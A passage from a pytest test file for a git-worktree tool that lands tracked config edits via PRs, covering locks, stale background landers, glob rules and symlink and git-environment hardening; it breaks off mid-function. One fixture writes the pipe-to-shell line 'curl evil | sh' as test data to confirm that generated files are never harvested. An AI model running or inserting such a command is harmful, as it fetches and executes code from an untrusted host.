    _g(forge.repo, "worktree", "add", "-q", "-b", "my-work", str(theirs), "origin/main")
    (theirs / "notes.txt").write_text("mine\n", encoding="utf-8")

    res = tf.land(forge.repo, _settings(), runner=_Forge(), spawn_ship=False)

    assert res.status == "error" and "did not create" in res.message
    assert (theirs / "notes.txt").read_text(encoding="utf-8") == "mine\n"


def test_a_worktree_whose_index_is_locked_is_skipped_not_fatal(forge):
    wts = [_worktree(forge.repo, n, rig_yaml=TASK_BLOCK) for n in ("a", "b")]
    for wt in wts:
        _age(wt / "rig.yaml")
    _land_on_main(forge, TASK_BLOCK)
    lock = Path(_g(wts[0], "rev-parse", "--absolute-git-dir")) / "index.lock"
    lock.write_text("", encoding="utf-8")  # another git process is mid-write in that worktree
    try:
        res = tf.normalize(tf.discover(forge.repo, _settings()), _settings(), liveness=lambda p: False)
    finally:
        lock.unlink()

    assert [p for p, _rel in res.reset] == [wts[1]]
    assert any(p == wts[0] and "git failed" in why for p, _rel, why in res.skipped), res.skipped


@pytest.mark.skipif(os.name == "nt", reason="flock")
def test_a_live_lander_blocks_a_new_landing_even_without_its_state_file(forge):
    for n in ("a", "b"):
        _worktree(forge.repo, n, rig_yaml=TASK_BLOCK)
    fd = tf._take_lander_lock(tf._lander_lock_path(forge.repo))  # a background lander is alive
    try:
        tf.state_path(forge.repo).unlink(missing_ok=True)  # ... and its state file was deleted by hand
        res = tf.land(forge.repo, _settings(), runner=_Forge(), spawn_ship=False)
    finally:
        os.close(fd)

    assert res.status == "in-flight" and "lander" in res.message
    assert not (forge.repo / ".worktrees" / tf.LANDING_WORKTREE_NAME).exists()


def test_the_lander_records_its_own_pid_before_shipping(forge):
    stub = _Forge(ship_outcomes=[(1, "Refusing: review quorum not met")])
    spath = _shipping_state(forge, stub)
    seen: list = []

    def runner(cmd, cwd=None, **kw):
        if cmd[:2] == ["gh", "ship"]:
            seen.append(json.loads(spath.read_text(encoding="utf-8")).get("pid"))
        return stub(cmd, cwd=cwd, **kw)

    tf.ship_loop(spath, runner=runner, sleep=lambda s: None)

    assert seen == [os.getpid()]


def test_a_malformed_ship_command_is_a_refusal_not_a_crash(forge):
    stub = _Forge()
    spath = _shipping_state(forge, stub)
    state = json.loads(spath.read_text(encoding="utf-8"))
    state["settings"]["ship_command"] = "gh 'ship"
    tf.write_state(spath, state)

    assert tf.ship_loop(spath, runner=stub, sleep=lambda s: None) == "ship-refused"
    assert "could not build the ship command" in json.loads(spath.read_text(encoding="utf-8"))["error"]
    with pytest.raises(ConfigError, match="does not parse"):
        validate({"version": 1, "tracked_files": {"ship": {"command": "gh 'ship"}}})


def test_a_staged_rename_is_not_reported_as_a_directory_entry(forge):
    wt = _worktree(forge.repo, "a")
    _g(wt, "mv", "rig.yaml", "rig2.yaml")

    disc = tf.discover(forge.repo, _settings())

    assert not any("names a directory" in note for note in disc.notes), disc.notes


def test_an_unfinished_post_merge_normalize_is_reported(forge):
    wt = _worktree(forge.repo, "a", commit="version: 1\n# a's own\n")
    (wt / "rig.yaml").write_text(BASE, encoding="utf-8")  # equals main: still to normalize
    state = {"status": "merged", "branch": "rig/tracked-files-x", "normalize_error": "index.lock exists"}

    lines = tf.render_plan_lines(tf.discover(forge.repo, _settings()), _settings(), state, [])

    assert any("post-merge normalize" in line and "index.lock exists" in line for line in lines), lines


def test_a_repo_without_an_origin_default_branch_keeps_writing_its_files_locally(tmp_path):
    from riglib.plan import _divert_tracked_files

    repo = tmp_path / "local-only"
    repo.mkdir()
    _g(repo, "init", "-q", "-b", "main")
    prefix = SimpleNamespace(kind="provision_ship_task_prefix", target=repo, category="task", item="code_prefix")
    plan = SimpleNamespace(actions=[prefix], diverted=[], notes=[])

    _divert_tracked_files(SimpleNamespace(data={"tracked_files": {}}, repo_root=repo), plan)

    assert plan.actions == [prefix] and plan.diverted == []
    assert any("no origin default branch" in n for n in plan.notes)


@pytest.mark.parametrize("argv", [[], ["ship-loop"], ["other", "x"]])
def test_the_internal_entry_prints_usage_for_anything_but_ship_loop(argv, capsys):
    assert tf.main(argv) == 2
    assert "usage: python -m riglib.tracked_files ship-loop" in capsys.readouterr().err


def test_a_symlinked_copy_is_never_harvested(forge, tmp_path):
    secret = tmp_path / "id_key"
    secret.write_text("PRIVATE KEY\n", encoding="utf-8")
    for n in ("a", "b"):
        wt = _worktree(forge.repo, n)
        (wt / "rig.yaml").unlink()
        (wt / "rig.yaml").symlink_to(secret)

    disc = tf.discover(forge.repo, _settings())

    assert disc.landings == [] and disc.landed_copies == []


def test_a_deleted_copy_is_neither_harvested_nor_normalized(forge):
    for n in ("a", "b"):
        (_worktree(forge.repo, n) / "rig.yaml").unlink()

    disc = tf.discover(forge.repo, _settings())

    assert disc.landings == [] and disc.landed_copies == []


GLOB_CASES = [
    (".github/workflows/x.yml", "*.yml", False),  # `*` stays in one segment, like git's :(glob)
    ("x.yml", "*.yml", True),
    (".github/workflows/x.yml", "**/*.yml", True),
    (".github/workflows/x.yml", ".github/workflows/*.yml", True),
    ("rig.yaml", "rig.yaml", True),
    ("sub/rig.yaml", "rig.yaml", False),
    ("conf/deep/x.yml", "conf**yml", False),  # `**` inside a segment is a plain `*`
    ("conf-x.yml", "conf**yml", True),
    ("a/b", "a/**/b", True),
    ("a/x/y/b", "a/**/b", True),
    ("a/x/y", "a/**", True),
]


@pytest.mark.parametrize("rel, pattern, owned", GLOB_CASES)
def test_path_globs_follow_git_pathspec_rules(rel, pattern, owned):
    assert tf.path_is_tracked_owned(rel, (pattern,)) is owned


@pytest.mark.parametrize("rel, pattern, owned", GLOB_CASES)
def test_the_glob_matcher_agrees_with_git_itself(tmp_path, rel, pattern, owned):
    # the scan lists files with git's own `:(glob)` pathspec; the matcher must draw the same line
    repo = tmp_path / "g"
    repo.mkdir()
    _g(repo, "init", "-q")
    (repo / rel).parent.mkdir(parents=True, exist_ok=True)
    (repo / rel).write_text("x\n", encoding="utf-8")
    _g(repo, "add", "-A")

    listed = _g(repo, "ls-files", "--", f":(glob){pattern}").splitlines()

    assert (rel in listed) is owned


def test_a_pr_open_landing_resolves_to_merged_once_main_carries_it(forge):
    for n in ("a", "b"):
        _worktree(forge.repo, n, rig_yaml=TASK_BLOCK)
    first = tf.land(forge.repo, _settings(land="pr"), runner=_Forge(), spawn_ship=False)
    _merge_landing_branch(forge)
    _g(forge.repo, "fetch", "-q", "origin")

    state = tf.refresh_state(forge.repo, tf.read_state(forge.repo))

    assert first.status == "pr-open"
    assert state["status"] == "merged" and not tf.in_flight(state)


def test_a_shipping_landing_whose_lander_died_is_no_longer_in_flight(forge):
    for n in ("a", "b"):
        _worktree(forge.repo, n, rig_yaml=TASK_BLOCK)
    tf.land(forge.repo, _settings(), runner=_Forge(), spawn_ship=False)
    spath = tf.state_path(forge.repo)
    state = json.loads(spath.read_text(encoding="utf-8"))
    tf.write_state(spath, {**state, "status": "shipping", "pid": 2**22 + 12345})  # no such process

    assert tf.refresh_state(forge.repo, tf.read_state(forge.repo))["status"] == "ship-stopped"


def test_a_leftover_locked_landing_worktree_is_cleaned_up_and_the_branch_is_fresh(forge):
    for n in ("a", "b"):
        _worktree(forge.repo, n, rig_yaml=TASK_BLOCK)
    leftover = tf.landing_worktree_path(forge.repo)  # a crashed earlier run left it behind, locked
    _g(forge.repo, "worktree", "add", "-q", "-b", "rig/tracked-files-old", str(leftover), "origin/main")
    _g(forge.repo, "worktree", "lock", str(leftover))

    res = tf.land(forge.repo, _settings(), runner=_Forge(), spawn_ship=False)

    assert res.status == "pr-open", res.message
    assert res.branch != "rig/tracked-files-old"  # a fresh branch, never a push onto the leftover one
    assert _g(forge.repo, "branch", "--list", "rig/tracked-files-old") == ""  # and the leftover's branch is gone


def test_a_run_from_inside_the_leftover_landing_worktree_is_refused(forge, monkeypatch):
    for n in ("a", "b"):
        _worktree(forge.repo, n, rig_yaml=TASK_BLOCK)
    leftover = tf.landing_worktree_path(forge.repo)
    _g(forge.repo, "worktree", "add", "-q", "-b", "rig/tracked-files-old", str(leftover), "origin/main")
    monkeypatch.chdir(leftover)

    res = tf.land(forge.repo, _settings(), runner=_Forge(), spawn_ship=False)

    assert res.status == "error" and "inside the leftover landing worktree" in res.message
    assert leftover.is_dir()


def test_a_minority_edit_next_to_a_landing_one_is_reported(forge):
    for n in ("a", "b"):
        _worktree(forge.repo, n, rig_yaml=TASK_BLOCK)
    _worktree(forge.repo, "c", rig_yaml=TASK_BLOCK + "# mine\n")

    disc = tf.discover(forge.repo, _settings())

    assert [pl.rel for pl in disc.landings] == ["rig.yaml"]
    assert any("1 other worktree(s) carry a different edit of rig.yaml" in n for n in disc.notes), disc.notes


@pytest.mark.skipif(os.name == "nt", reason="flock")
def test_a_lander_that_never_started_is_reported_stopped(forge):
    import time

    for n in ("a", "b"):
        _worktree(forge.repo, n, rig_yaml=TASK_BLOCK)
    tf.land(forge.repo, _settings(), runner=_Forge(), spawn_ship=False)
    base = json.loads(tf.state_path(forge.repo).read_text(encoding="utf-8"))
    stale = {**base, "status": "shipping", "pid": None, "spawned_at": time.time() - 3600}
    starting = {**base, "status": "shipping", "pid": None, "spawned_at": time.time()}

    assert tf.refresh_state(forge.repo, stale)["status"] == "ship-stopped"
    assert tf.refresh_state(forge.repo, starting)["status"] == "shipping"


def test_status_shows_the_pending_merge_and_no_drift_for_held_back_actions(forge, monkeypatch, capsys,
                                                                           fake_agent_tools):
    from riglib.cli import main

    _cli_env(forge, monkeypatch, fake_agent_tools)
    a = _worktree(forge.repo, "a", rig_yaml=TASK_BLOCK)
    _worktree(forge.repo, "b", rig_yaml=TASK_BLOCK)

    main(["status", "-C", str(a)])
    out = capsys.readouterr().out

    assert "tracked_files — pending merges to the default branch:" in out
    assert "land rig's own reconcile of .ship-config" in out
    assert ".ship-config does not exist" not in out and "SHIP_TASK_CODE_PREFIX= line is absent" not in out
    # the area summary agrees: the held-back area is not "not configured"
    assert "SHIP_TASK_CODE_PREFIX): held back — lands on the default branch via tracked_files" in out


def test_apply_commit_lands_harvest_and_held_back_reconcile_end_to_end(forge, monkeypatch, capsys, fake_agent_tools,
                                                                       tmp_path):
    """The real CLI path: `rig apply commit --only tracked_files` rebuilds the plan in the landing
    worktree (reading the landed rig.yaml), runs the held-back .ship-config reconcile there, and
    opens the PR with a stub `gh`."""
    from riglib.cli import main

    _cli_env(forge, monkeypatch, fake_agent_tools)
    _set_origin_url(forge, "https://github.com/o/r.git")
    bin_dir = tmp_path / "bin"
    bin_dir.mkdir()
    (bin_dir / "gh").write_text("#!/bin/sh\necho https://github.com/o/r/pull/9\n", encoding="utf-8")
    (bin_dir / "gh").chmod(0o755)
    monkeypatch.setenv("PATH", f"{bin_dir}{os.pathsep}{os.environ.get('PATH', '')}")
    monkeypatch.setattr(tf.shutil, "which", lambda name: str(bin_dir / name) if name == "gh" else None)
    a = _worktree(forge.repo, "a", rig_yaml=TASK_BLOCK)
    _worktree(forge.repo, "b", rig_yaml=TASK_BLOCK)

    rc = main(["apply", "commit", "--only", "tracked_files", "-C", str(a)])
    out = capsys.readouterr().out

    assert rc == 0, out
    state = tf.read_state(forge.repo)
    assert state["status"] == "pr-open" and state["pr_number"] == 9
    assert _g(forge.origin, "show", f"{state['branch']}:rig.yaml") + "\n" == TASK_BLOCK
    assert _g(forge.origin, "show", f"{state['branch']}:.ship-config") == "SHIP_TASK_CODE_PREFIX=UB"
    assert not (a / ".ship-config").exists()  # never written into the checkout


# ── second review round: forge state, lock, index, filters, races, spawn ──────────


def test_a_landing_whose_pr_was_closed_unmerged_no_longer_blocks(forge):
    for n in ("a", "b"):
        _worktree(forge.repo, n, rig_yaml=TASK_BLOCK)
    first = tf.land(forge.repo, _settings(), runner=_Forge(), spawn_ship=False)

    second = tf.land(forge.repo, _settings(), runner=_Forge(pr_state="Closed"), spawn_ship=False)

    assert first.status == "pr-open" and second.status == "pr-open", second.message
    assert second.branch != first.branch


def test_a_refused_landing_blocks_while_its_pr_is_still_open(forge):
    for n in ("a", "b"):
        _worktree(forge.repo, n, rig_yaml=TASK_BLOCK)
    tf.land(forge.repo, _settings(), runner=_Forge(), spawn_ship=False)
    spath = tf.state_path(forge.repo)
    tf.write_state(spath, {**json.loads(spath.read_text(encoding="utf-8")), "status": "ship-refused",
                           "error": "Refusing: review quorum not met\n"})

    again = tf.land(forge.repo, _settings(), runner=_Forge(pr_state="Open"), spawn_ship=False)
    lines = tf.render_plan_lines(tf.discover(forge.repo, _settings()), _settings(), tf.read_state(forge.repo), [])

    assert again.status == "in-flight" and "still open" in again.message
    assert any("last landing ship-refused" in line and "Refusing: review quorum not met" in line
               and "['" not in line for line in lines)


def test_previews_do_not_write_the_state_file(forge):
    for n in ("a", "b"):
        _worktree(forge.repo, n, rig_yaml=TASK_BLOCK)
    tf.land(forge.repo, _settings(), runner=_Forge(), spawn_ship=False)
    _merge_landing_branch(forge)
    _g(forge.repo, "fetch", "-q", "origin")
    before = tf.state_path(forge.repo).read_text(encoding="utf-8")

    assert tf.refresh_state(forge.repo, tf.read_state(forge.repo))["status"] == "merged"
    assert tf.state_path(forge.repo).read_text(encoding="utf-8") == before


def test_a_second_concurrent_landing_is_refused_by_the_lock(forge):
    for n in ("a", "b"):
        _worktree(forge.repo, n, rig_yaml=TASK_BLOCK)

    with tf._landing_lock(forge.repo):  # another `rig apply commit` holds the repo's landing lock
        busy = tf.land(forge.repo, _settings(), runner=_Forge(), spawn_ship=False)
    free = tf.land(forge.repo, _settings(), runner=_Forge(), spawn_ship=False)

    # a busy lock is a landing in flight (rc 0 for `rig apply commit`), not a failure
    assert busy.status == "in-flight" and "landing lock" in busy.message
    assert free.status == "pr-open", free.message


def test_the_lock_is_shared_by_every_checkout_of_the_repo(forge):
    wt = _worktree(forge.repo, "a")

    assert tf.state_path(wt) == tf.state_path(forge.repo)
    assert tf.landing_worktree_path(wt) == forge.repo / ".worktrees" / tf.LANDING_WORKTREE_NAME


def test_a_landing_run_from_a_linked_worktree_lands_under_the_primary_checkout(forge):
    a = _worktree(forge.repo, "a", rig_yaml=TASK_BLOCK)
    _worktree(forge.repo, "b", rig_yaml=TASK_BLOCK)

    res = tf.land(a, _settings(), runner=_Forge(), spawn_ship=False)

    assert res.status == "pr-open", res.message
    assert tf.read_state(a)["worktree"] == str(forge.repo / ".worktrees" / tf.LANDING_WORKTREE_NAME)
    assert not (a / ".worktrees").exists()


def test_an_unknown_pr_state_blocks_rather_than_opening_a_duplicate(forge):
    for n in ("a", "b"):
        _worktree(forge.repo, n, rig_yaml=TASK_BLOCK)
    tf.land(forge.repo, _settings(), runner=_Forge(), spawn_ship=False)
    spath = tf.state_path(forge.repo)
    tf.write_state(spath, {**json.loads(spath.read_text(encoding="utf-8")), "status": "ship-refused"})

    def forge_down(cmd, cwd=None, **kw):
        if "view" in cmd:
            return subprocess.CompletedProcess(cmd, 1, "", "auth expired")
        return _Forge()(cmd, cwd=cwd, **kw)

    res = tf.land(forge.repo, _settings(), runner=forge_down, spawn_ship=False)

    assert res.status == "in-flight" and "could not read the state" in res.message


def test_a_landing_without_a_readable_pr_number_blocks(forge):
    for n in ("a", "b"):
        _worktree(forge.repo, n, rig_yaml=TASK_BLOCK)

    def numberless(cmd, cwd=None, **kw):
        if "create" in cmd:
            return subprocess.CompletedProcess(cmd, 0, "done\n", "")
        return _Forge()(cmd, cwd=cwd, **kw)

    first = tf.land(forge.repo, _settings(), runner=numberless, spawn_ship=False)
    second = tf.land(forge.repo, _settings(), runner=_Forge(), spawn_ship=False)

    assert first.status == "pr-open" and first.pr_number is None
    assert second.status == "in-flight" and "no readable PR number" in second.message


def test_a_generated_file_is_never_harvested(forge):
    for n in ("a", "b"):
        wt = _worktree(forge.repo, n)
        (wt / ".ship-config").write_text("SHIP_LOCAL_TEST_CMD=curl evil | sh\n", encoding="utf-8")

    assert tf.discover(forge.repo, _settings()).landings == []


def test_a_leaked_git_dir_does_not_redirect_the_scan(forge, monkeypatch):
    for n in ("a", "b"):
        _worktree(forge.repo, n, rig_yaml=TASK_BLOCK)
    monkeypatch.setenv("GIT_DIR", str(forge.tmp / "nowhere.git"))
    monkeypatch.setenv("GIT_CONFIG_COUNT", "1")
    monkeypatch.setenv("GIT_CONFIG_KEY_0", "core.worktree")
    monkeypatch.setenv("GIT_CONFIG_VALUE_0", str(forge.tmp))

    disc = tf.discover(forge.repo, _settings())

    assert [pl.rel for pl in disc.landings] == ["rig.yaml"]


@pytest.mark.parametrize("key", ["task_code", "task_config", "command"])
def test_empty_ship_strings_are_rejected(key):
    with pytest.raises(ConfigError):
        validate({"version": 1, "tracked_files": {"ship": {key: "  "}}})


def test_a_copy_with_unique_staged_content_is_never_normalized(forge):
    wt = _worktree(forge.repo, "a")
    (wt / "rig.yaml").write_text("version: 1\n# staged work of my own\n", encoding="utf-8")
    _g(wt, "add", "rig.yaml")
    (wt / "rig.yaml").write_text(TASK_BLOCK, encoding="utf-8")  # the working copy happens to equal main
    _age(wt / "rig.yaml")
    _land_on_main(forge, TASK_BLOCK)

    disc = tf.discover(forge.repo, _settings())

    assert disc.landed_copies == []
    assert "staged work of my own" in _g(wt, "show", ":rig.yaml")


def test_normalize_skips_a_copy_that_changed_after_the_scan(forge):
    wt = _worktree(forge.repo, "a", rig_yaml=TASK_BLOCK)
    _age(wt / "rig.yaml")
    _land_on_main(forge, TASK_BLOCK)
    disc = tf.discover(forge.repo, _settings())
    (wt / "rig.yaml").write_text(TASK_BLOCK + "# typed a moment ago\n", encoding="utf-8")

    res = tf.normalize(disc, _settings(), liveness=lambda p: False)

    assert res.reset == [] and res.skipped[0][2] == "changed since the scan"
    assert (wt / "rig.yaml").read_text(encoding="utf-8").endswith("# typed a moment ago\n")


def test_comparisons_go_through_git_filters_not_raw_bytes(forge):
    _g(forge.repo, "config", "core.autocrlf", "true")
    wt = _worktree(forge.repo, "a")
    (wt / "rig.yaml").write_bytes(TASK_BLOCK.replace("\n", "\r\n").encode())
    _age(wt / "rig.yaml")
    _land_on_main(forge, TASK_BLOCK)

    disc = tf.discover(forge.repo, _settings())

    assert [(c.checkout, c.rel) for c in disc.landed_copies] == [(wt, "rig.yaml")]


def test_a_broken_landed_rig_yaml_fails_the_landing_cleanly(forge):
    for n in ("a", "b"):
        _worktree(forge.repo, n, rig_yaml=TASK_BLOCK)

    def apply_diverted(landing: Path) -> list[str]:
        raise ValueError("invalid YAML in rig.yaml")

    res = tf.land(forge.repo, _settings(), apply_diverted=apply_diverted, runner=_Forge(), spawn_ship=False)

    assert res.status == "error" and "invalid YAML" in res.message
    assert not (forge.repo / ".worktrees" / tf.LANDING_WORKTREE_NAME).exists()
    assert _g(forge.origin, "branch", "--list", "rig/*") == ""


@pytest.mark.parametrize("paths", [[], ["docs/"]])
def test_empty_or_directory_paths_are_rejected(paths):
    with pytest.raises(ConfigError):
        validate({"version": 1, "tracked_files": {"paths": paths}})


@pytest.mark.skipif(os.name == "nt", reason="POSIX shell stub for the ship command")
def test_the_spawned_background_lander_ships_and_records_the_verdict(forge, tmp_path):
    for n in ("a", "b"):
        _worktree(forge.repo, n, rig_yaml=TASK_BLOCK)
    ship = tmp_path / "fake-ship"
    ship.write_text("#!/bin/sh\necho \"shipped #$1\"\n", encoding="utf-8")
    ship.chmod(0o755)
    stub = _Forge()

    res = tf.land(forge.repo, _settings(land="ship", ship_task_code="UB-3", ship_command=str(ship)), runner=stub)

    assert res.status == "shipping", res.message
    import time as _time

    deadline = _time.time() + 30
    while _time.time() < deadline and tf.read_state(forge.repo)["status"] == "shipping":
        _time.sleep(0.5)
    state = tf.read_state(forge.repo)
    assert state["status"] == "merged", Path(state["log"]).read_text(encoding="utf-8")
    assert "shipped #7" in Path(state["log"]).read_text(encoding="utf-8")


# ── fourth review round: tracked+ignored, symlinked landing writes, stale lander, forge ──


def test_a_tracked_file_that_an_ignore_rule_also_matches_is_still_diverted(forge):
    (forge.repo / ".ship-config").write_text("SHIP_TASK_CODE_PREFIX=UB\n", encoding="utf-8")
    _g(forge.repo, "add", ".ship-config")
    _g(forge.repo, "commit", "-qm", "ship-config")
    (forge.repo / ".gitignore").write_text(".ship-config\n", encoding="utf-8")  # ignored later
    prefix = SimpleNamespace(kind="provision_ship_task_prefix", target=forge.repo)

    kept, diverted = tf.divert_actions([prefix], forge.repo, _settings())

    assert diverted == [prefix] and kept == []


@pytest.mark.skipif(os.name == "nt", reason="symlinks")
def test_a_symlinked_file_on_the_default_branch_is_never_written_through(forge, tmp_path):
    # origin/main commits .ship-config as a RELATIVE symlink that resolves only from the landing
    # worktree's deeper path — the held-back reconcile must refuse, leaving the target untouched
    victim = forge.repo / "victim.txt"
    victim.write_text("keep me\n", encoding="utf-8")
    tmp = forge.tmp / "pusher-symlink"
    _g(forge.tmp, "clone", "-q", str(forge.origin), str(tmp))
    (tmp / ".ship-config").symlink_to("../../victim.txt")
    _g(tmp, "add", ".ship-config")
    _g(tmp, "commit", "-qm", "symlink")
    _g(tmp, "push", "-q", "origin", "HEAD:main")
    _g(forge.repo, "pull", "-q", "--ff-only")
    for n in ("a", "b"):
        _worktree(forge.repo, n, rig_yaml=TASK_BLOCK)

    def build_plan(landing: Path):
        action = SimpleNamespace(kind="provision_ship_task_prefix", target=landing, category="task", item="code_prefix")
        return SimpleNamespace(actions=[], diverted=[action])

    res = tf.land(forge.repo, _settings(),
                  apply_diverted=lambda wt: tf.run_diverted(wt, build_plan, _settings()),
                  runner=_Forge(), spawn_ship=False)

    assert res.status == "error" and "symlink" in res.message
    assert victim.read_text(encoding="utf-8") == "keep me\n"


def test_a_newer_landing_is_not_clobbered_by_a_stale_background_lander(forge):
    for n in ("a", "b"):
        _worktree(forge.repo, n, rig_yaml=TASK_BLOCK)
    tf.land(forge.repo, _settings(), runner=_Forge(), spawn_ship=False)
    spath = tf.state_path(forge.repo)
    newer = {**json.loads(spath.read_text(encoding="utf-8")), "branch": "rig/tracked-files-newer"}

    def ship(cmd, cwd=None, **kw):
        if cmd[:2] == ["gh", "ship"]:
            tf.write_state(spath, newer)  # a newer landing took the repo over mid-ship
            return subprocess.CompletedProcess(cmd, 0, "merged", "")
        return _Forge()(cmd, cwd=cwd, **kw)

    outcome = tf.ship_loop(spath, runner=ship, sleep=lambda s: None)

    assert outcome == "merged"
    assert json.loads(spath.read_text(encoding="utf-8"))["branch"] == "rig/tracked-files-newer"
    assert (forge.repo / ".worktrees" / tf.LANDING_WORKTREE_NAME).exists()  # not torn down


def test_a_running_lander_blocks_a_new_landing(forge):
    for n in ("a", "b"):
        _worktree(forge.repo, n, rig_yaml=TASK_BLOCK)
    tf.land(forge.repo, _settings(), runner=_Forge(), spawn_ship=False)
    spath = tf.state_path(forge.repo)
    tf.write_state(spath, {**json.loads(spath.read_text(encoding="utf-8")), "status": "merged", "pid": os.getpid()})
    fd = tf._take_lander_lock(tf._lander_lock_path(forge.repo))  # its lander is cleaning up after the merge
    try:
        res = tf.land(forge.repo, _settings(), runner=_Forge(), spawn_ship=False)
    finally:
        if fd is not None:
            os.close(fd)

    assert res.status == "in-flight" and "background lander" in res.message


@pytest.mark.skipif(os.name == "nt", reason="flock")
def test_a_recycled_pid_does_not_pin_later_landings(forge):
    for n in ("a", "b"):
        _worktree(forge.repo, n, rig_yaml=TASK_BLOCK)
    tf.land(forge.repo, _settings(), runner=_Forge(), spawn_ship=False)
    _merge_landing_branch(forge)
    spath = tf.state_path(forge.repo)
    # a lander killed mid-cleanup left its pid behind, and the OS gave that pid to another process
    tf.write_state(spath, {**json.loads(spath.read_text(encoding="utf-8")), "status": "merged", "pid": os.getpid()})
    _g(forge.repo, "fetch", "-q", "origin")
    for n in ("c", "d"):  # the next edit, on top of the merged landing
        _worktree(forge.repo, n, rig_yaml="version: 1\n# next edit\n")

    res = tf.land(forge.repo, _settings(), runner=_Forge(), spawn_ship=False)

    assert res.status == "pr-open", res.message


def test_a_pushed_branch_whose_pr_could_not_open_is_deleted_again(forge):
    for n in ("a", "b"):
        _worktree(forge.repo, n, rig_yaml=TASK_BLOCK)

    def failing_pr(cmd, cwd=None, **kw):
        if "create" in cmd:
            return subprocess.CompletedProcess(cmd, 1, "", "gh: rate limited")
        return _Forge()(cmd, cwd=cwd, **kw)

    res = tf.land(forge.repo, _settings(), runner=failing_pr, spawn_ship=False)

    assert res.status == "error" and "deleted again" in res.message
    assert _g(forge.origin, "branch", "--list", "rig/*") == ""  # nothing left behind on the forge
    assert tf.read_state(forge.repo) is None  # a re-run starts clean


def test_a_missing_forge_cli_stops_the_landing_before_the_review_and_the_push(forge, monkeypatch):
    for n in ("a", "b"):
        _worktree(forge.repo, n, rig_yaml=TASK_BLOCK)
    monkeypatch.setattr(tf.shutil, "which", lambda name: None)

    res = tf.land(forge.repo, _settings(), spawn_ship=False)

    assert res.status == "error" and "not installed" in res.message and "nothing was pushed" in res.message
    assert _g(forge.origin, "branch", "--list", "rig/*") == ""


@pytest.mark.parametrize("url, forge_kind", [
    ("https://github.com/o/r.git", "github"),
    ("git@github.com:o/r.git", "github"),
    ("https://github.acme.example/o/r.git", "github"),
    ("https://git.hyperide.ai/ultrabricks/r.git", "forgejo"),
])
def test_forge_detection(forge, url, forge_kind):
    _g(forge.repo, "remote", "set-url", "origin", url)

    assert tf.forge_of(forge.repo)[0] == forge_kind


@pytest.mark.parametrize("pattern", ["conf/[ab].yml", "ci/{a,b}.yml"])
def test_glob_classes_and_braces_are_rejected(pattern):
    with pytest.raises(ConfigError):
        validate({"version": 1, "tracked_files": {"paths": [pattern]}})


# ── fifth review round ─────────────────────────────────────────────────────────────


@pytest.mark.parametrize("pattern", [".*", "*", "**", "**/*"])
def test_a_broad_glob_never_diverts_a_directory_target_action(forge, pattern):
    # the GitHub-API provisioners use the repo root only as a display target: never "a file"
    ruleset = SimpleNamespace(kind="provision_github_ruleset", target=forge.repo, category="github", item="ruleset")

    kept, diverted = tf.divert_actions([ruleset], forge.repo, _settings(paths=(pattern,)))

    assert (kept, diverted) == ([ruleset], [])


def test_a_finished_lander_drops_its_pid(forge):
    stub = _Forge(ship_outcomes=[(1, "Refusing: review quorum not met")])
    spath = _shipping_state(forge, stub)
    tf.write_state(spath, {**json.loads(spath.read_text(encoding="utf-8")), "pid": os.getpid()})

    tf.ship_loop(spath, runner=stub, sleep=lambda s: None)

    assert json.loads(spath.read_text(encoding="utf-8"))["pid"] is None


def test_a_shipping_state_without_a_pid_yet_is_still_in_flight(forge):
    for n in ("a", "b"):
        _worktree(forge.repo, n, rig_yaml=TASK_BLOCK)
    tf.land(forge.repo, _settings(), runner=_Forge(), spawn_ship=False)
    spath = tf.state_path(forge.repo)
    starting = {**json.loads(spath.read_text(encoding="utf-8")), "status": "shipping", "pid": None}

    assert tf.refresh_state(forge.repo, starting)["status"] == "shipping"


def test_a_leaked_global_git_config_does_not_reach_the_landing_git_calls(forge, monkeypatch, tmp_path):
    for n in ("a", "b"):
        _worktree(forge.repo, n, rig_yaml=TASK_BLOCK)
    evil = tmp_path / "evil.gitconfig"
    evil.write_text("[user]\n\tname = evil\n\temail = evil@example.test\n", encoding="utf-8")
    monkeypatch.setenv("GIT_CONFIG_GLOBAL", str(evil))
    monkeypatch.delenv("GIT_COMMITTER_NAME")  # would otherwise win over any config
    # the landing's git falls back to $HOME/.gitconfig (conftest's throwaway HOME)
    (Path(os.environ["HOME"]) / ".gitconfig").write_text("[user]\n\tname = home\n\temail = home@example.test\n",
                                                          encoding="utf-8")

    res = tf.land(forge.repo, _settings(), runner=_Forge(), spawn_ship=False)

    assert res.status == "pr-open", res.message
    assert _g(forge.origin, "log", "-1", "--format=%cn", res.branch) == "home"


def test_the_landing_lock_is_a_kernel_lock_even_without_fcntl(forge, monkeypatch):
    # Windows: msvcrt.locking stands in for flock — no pid file, nothing to take over
    import builtins

    real_import = builtins.__import__
    held: set[int] = set()

    def fake_import(name, *a, **k):
        if name == "fcntl":
            raise ImportError
        if name == "msvcrt":
            def locking(fd, mode, n):
                key = os.fstat(fd).st_ino
                if key in held:
                    raise PermissionError("locked")
                held.add(key)
            return SimpleNamespace(LK_NBLCK=2, locking=locking)
        return real_import(name, *a, **k)

    monkeypatch.setattr(builtins, "__import__", fake_import)
    with tf._landing_lock(forge.repo):
        with pytest.raises(tf.LandingLockBusy):
            with tf._landing_lock(forge.repo):
                pass


def test_nothing_to_land_names_the_checkout_that_differs(forge):
    for n in ("a", "b"):
        _worktree(forge.repo, n, rig_yaml=TASK_BLOCK)
    _land_on_main(forge, TASK_BLOCK)  # the default branch already carries it

    # rig's reconcile, re-run on the default branch, writes what main already has
    res = tf.land(forge.repo, _settings(), apply_diverted=lambda wt: ["rig.yaml"], runner=_Forge(),
                  spawn_ship=False)

    assert res.status == "nothing", res.message
    assert "this checkout's rig.yaml differs" in res.message


def test_the_pid_probe_never_signals_a_process_on_windows(monkeypatch):
    monkeypatch.setattr(tf, "_WINDOWS", True)
    monkeypatch.setattr(tf.os, "kill", lambda *a: pytest.fail("os.kill(pid, 0) terminates the process on Windows"))
    monkeypatch.setattr(tf, "_win_pid_alive", lambda pid: pid == 4242)

    assert tf._pid_alive(4242) is True and tf._pid_alive(4343) is False


def test_a_dangling_origin_head_falls_back_to_an_existing_branch(forge):
    _g(forge.repo, "symbolic-ref", "refs/remotes/origin/HEAD", "refs/remotes/origin/renamed-away")

    assert tf.default_branch(forge.repo) == "main"


def test_a_not_yet_created_directory_target_is_never_diverted(forge):
    skill = SimpleNamespace(kind="install_skill", target=forge.repo / ".claude" / "skills" / "new-skill",
                            category="skills", item="new-skill")

    kept, diverted = tf.divert_actions([skill], forge.repo, _settings(paths=("**",)))

    assert (kept, diverted) == ([skill], [])


def test_a_failing_held_back_check_degrades_to_a_note(forge, monkeypatch):
    def boom(*_a, **_k):
